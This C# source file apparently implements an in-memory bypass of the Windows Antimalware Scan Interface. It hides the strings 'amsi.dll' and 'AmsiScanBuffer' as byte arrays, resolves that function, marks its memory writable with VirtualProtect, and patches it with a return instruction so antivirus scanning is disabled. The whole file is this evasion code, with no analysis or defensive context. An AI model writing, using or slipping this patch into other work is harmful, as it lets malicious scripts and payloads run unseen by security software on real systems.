using System;
using System.Runtime.InteropServices;
using System.Text;

public class AmBp
{
    static byte[] patchBytes = new byte[] { 0xC3 };

    public static void Bpss()
    {
        try
        {
            string decL = Encoding.ASCII.GetString(new byte[] { 97, 109, 115, 105, 46, 100, 108, 108 });
            string decP = Encoding.ASCII.GetString(new byte[] { 65, 109, 115, 105, 83, 99, 97, 110, 66, 117, 102, 102, 101, 114 });

            var lib = Win32.LoadLibrary(decL);
            var addr = Win32.GetProcAddress(lib, decP);

            uint oldProtect;
            Win32.VirtualProtect(addr, (UIntPtr)patchBytes.Length, 0x40, out oldProtect);

            Marshal.Copy(patchBytes, 0, addr, patchBytes.Length);
        }
        catch (Exception e)
        {
            Console.WriteLine(" [x] {0}", e.Message);
            Console.WriteLine(" [x] {0}", e.InnerException);
        }
    }
}

class Win32
{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
